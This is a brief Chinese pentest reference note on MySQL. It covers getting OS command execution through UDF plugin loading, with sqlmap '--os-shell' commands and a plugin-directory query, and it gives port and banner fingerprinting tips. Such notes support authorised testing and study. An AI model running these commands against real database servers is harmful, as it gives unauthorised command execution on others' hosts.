## 组件简介

Mysql常见数据库服务。

## 漏洞列表

| 漏洞名称 | 漏洞ID | 影响版本 | CVSS |
| -------- | ------ | -------- | ---- |
|          |        |          |      |

### UDF

相当于上传一个.dll/.so直接加载，可以执行命令

1. sqlmap自动利用
```bash
sqlmap -d 'mysql://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME' --os-shell
sqlmap -d 'access://DATABASE_FILEPATH' --os-shell
```

2. 手动利用
参考文章[利用MySQL UDF进行的一次渗透测试](https://www.freebuf.com/articles/system/163144.html)

> tips

```mysql
# 读插件位置
select @@plugin_dir;
```

## 组件指纹

1. 端口常为3306
2. nc可探测banner


